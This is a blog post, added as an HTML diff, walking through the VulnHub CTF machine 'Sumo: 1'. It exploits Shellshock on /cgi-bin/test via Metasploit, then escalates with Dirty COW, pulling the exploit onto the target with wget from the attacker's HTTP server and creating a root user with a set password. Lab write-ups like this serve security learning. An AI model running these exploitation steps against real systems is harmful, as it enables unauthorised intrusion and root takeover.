@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>Walkthrough Sumo: 1</title>
+
+	<!-- Favicon -->
+	<link rel="shortcut icon" href="../img/favicon.ico" type="image/icon">
+	<link rel="icon" href="../img/favicon.ico" type="image/icon">
+
+	<!-- Bootstrap Core CSS -->
+    <link href="../vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Theme CSS -->
+    <link href="../css/clean-blog.min.css" rel="stylesheet">
+
+    <!-- Custom Fonts -->
+    <link href="../vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+
+</head>
+
+<body>
+
+    <!-- Navigation -->
+    <nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+        <div class="container-fluid">
+            <!-- Brand and toggle get grouped for better mobile display -->
+            <div class="navbar-header page-scroll">
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                    <span class="sr-only">Toggle navigation</span>
+                    Menu <i class="fa fa-bars"></i>
+                </button>
+                <a class="navbar-brand" href="../">(´• ω •)</a>
+            </div>
+
+            <!-- Collect the nav links, forms, and other content for toggling -->
+            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="../">Home</a>
+                    </li>
+                    <li>
+                        <a href="../about/">About</a>
+                    </li>
+                    <li>
+                        <a href="../contact/">Contact</a>
+                    </li>
+                </ul>
+            </div>
+            <!-- /.navbar-collapse -->
+        </div>
+        <!-- /.container -->
+    </nav>
+
+    <!-- Page Header -->
+    <!-- Set your background image for this header on the line below. -->
+    <header class="intro-header" style="background-image: url('../img/post9/Sumo-00.jpg')">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <div class="post-heading">
+                        <h1>SunCSR Team: Sumo</h1>
+                        <h2 class="subheading">Difficulty: Beginner to Intermediate</h2>
+						<span class="meta">Posted by <a href="../about/">Admin</a> on May 19, 2020</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Post Content -->
+    <article>
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <p><a href="https://www.vulnhub.com/entry/sumo-1,480/">CTF link</a></p>
+
+					<p>Good afternoon, today we will be walkthrough the Sumo_Sun machine from the <a href="https://www.vulnhub.com/author/suncsr-team,696/">SunCSR Team</a>.</p>
+
+					<li>Goal: Get the root shell i.e.(root@localhost:~#) and then obtain flag under /root).</li>
+
+					<h2 class="section-heading">Enumeration</h2>
+
+					<p>First, scan the internal network and find the ip address of our target.</p>
+
+					<a href="../img/post9/image1.png">
+                        <img class="img-responsive" src="../img/post9/image1.png" alt="">
+                    </a>
+
+					<pre><code>arp-scan -l</code></pre>
+
+					<p>When scanning ports, we find the apache2 server running on port 80, let's see what it contains.</p>
+
+					<a href="../img/post9/image2.png">
+                        <img class="img-responsive" src="../img/post9/image2.png" alt="">
+                    </a>
+
+					<pre><code>nmap -A -T4 192.168.2.102 > nmap_scan.txt && cat nmap_scan.txt</code></pre>
+
+				    <p>And so before us is a regular web page. I will use nikto to find something interesting.</p>
+
+					<a href="../img/post9/image3.png">
+                        <img class="img-responsive" src="../img/post9/image3.png" alt="">
+                    </a>
+
+					<h2 class="section-heading">Shell</h2>
+
+					<p>Nikto detected an uncommon header and apparently this is a CVE hint that we need to use, we also see that /cgi-bin/test has a shellshock vulnerability.</p>
+
+					<a href="../img/post9/image4.png">
+                        <img class="img-responsive" src="../img/post9/image4.png" alt="">
+                    </a>
+
+					<pre><code>nikto -h http://192.168.2.102</code></pre>
+
+					<p>To exploit this vulnerability, I will use metasploit</p>
+
+					<a href="../img/post9/image5.png">
+                        <img class="img-responsive" src="../img/post9/image5.png" alt="">
+                    </a>
+
+					<a href="../img/post9/image6.png">
+                        <img class="img-responsive" src="../img/post9/image6.png" alt="">
+                    </a>
+
+					<pre><code>set RHOSTS 192.168.2.102</code></pre>
+					<pre><code>set TARGETURI /cgi-bin/test</code></pre>
+					<pre><code>run</code></pre>
+					<pre><code>shell</code></pre>
+					<pre><code>python -c 'import pty; pty.spawn("/bin/sh")'</code></pre>
+
+
+					<h2 class="section-heading">PE</h2>
+
+					<p>At this stage we successfully got access to the machine as www-data, now we need to get root</p>
+
+					<p>First, I will check the system for the <a href="https://en.wikipedia.org/wiki/Dirty_COW">dirty cow</a> vulnerability using the <a href="https://github.com/aishee/scan-dirtycow/blob/master/dirtycowscan.sh">dirtycowscan.sh</a> script. As the script showed, the system is vulnerable</p>
+
+					<a href="../img/post9/image7.png">
+                        <img class="img-responsive" src="../img/post9/image7.png" alt="">
+                    </a>
+
+					<p>Using python HTTP Server and wget I deliver <a href="https://www.exploit-db.com/raw/40839">exploit</a> code to our goal. using gcc, I compile the exploit code and get the executable</p>
+
+					<a href="../img/post9/image8.png">
+                        <img class="img-responsive" src="../img/post9/image8.png" alt="">
+                    </a>
+					<pre><code>wget https://www.exploit-db.com/raw/40839</code></pre>
+					<pre><code>mv 40839 dirty.c</code></pre>
+					<pre><code>python -m SimpleHTTPServer 91</code></pre>
+					<pre><code>wget http://192.168.2.107:91/dirty.c</code></pre>
+					<pre><code>gcc -pthread dirty.c -o dirty -lcrypt</code></pre>
+
+					<p>Using the exploit, I created a new root user with the password n3ws3cr3tpass. now i connect to it using ssh</p>
+
+					<a href="../img/post9/image9.png">
+                        <img class="img-responsive" src="../img/post9/image9.png" alt="">
+                    </a>
+					<pre><code>./dirty n3ws3cr3tpass</code></pre>
+					<pre><code>firefart:n3ws3cr3tpass</code></pre>
+
+					<p>And i got root flag</p>
+
+					<a href="../img/post9/image10.png">
+                        <img class="img-responsive" src="../img/post9/image10.png" alt="">
+                    </a>
+
+					<pre><code>{Sum0-SunCSR-2020_r001}</code></pre>
+
+
+			    </div>
+            </div>
+        </div>
+    </article>
+
+    <hr>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <ul class="list-inline text-center">
+                        <li>
+                            <a href="https://twitter.com/laf3r_" title="I'm on Twitter">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    </ul>
+                    <p class="copyright text-muted">Copyright &copy; laf3r.github.io 2019-2022</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- jQuery -->
+    <script src="../vendor/jquery/jquery.min.js"></script>
+
+    <!-- Bootstrap Core JavaScript -->
+    <script src="../vendor/bootstrap/js/bootstrap.min.js"></script>
+
+    <!-- Contact Form JavaScript -->
+    <script src="../js/jqBootstrapValidation.js"></script>
+    <script src="../js/contact_me.js"></script>
+
+    <!-- Theme JavaScript -->
+    <script src="../js/clean-blog.min.js"></script>
+
+</body>
+
+</html>
